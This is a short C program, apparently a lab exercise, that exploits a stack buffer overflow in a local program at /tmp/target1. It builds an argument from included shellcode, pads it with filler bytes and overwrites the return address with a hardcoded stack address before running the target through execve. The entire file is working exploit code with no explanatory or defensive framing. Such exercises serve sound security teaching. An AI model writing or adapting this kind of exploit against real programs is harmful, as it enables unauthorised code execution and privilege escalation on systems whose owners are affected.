
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;

  args[1] = (char *) malloc(249 * sizeof(char));
  strcpy(args[1], shellcode);
  int n = strlen(shellcode);
  int i;
  for(i = 0; i < 244 - n; ++ i) {
    args[1][n + i] = 'A';
  }
  args[1][244] = 0x88;
  args[1][245] = 0xfc;
  args[1][246] = 0xff;
  args[1][247] = 0xbf;
  args[1][248] = '\0';

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
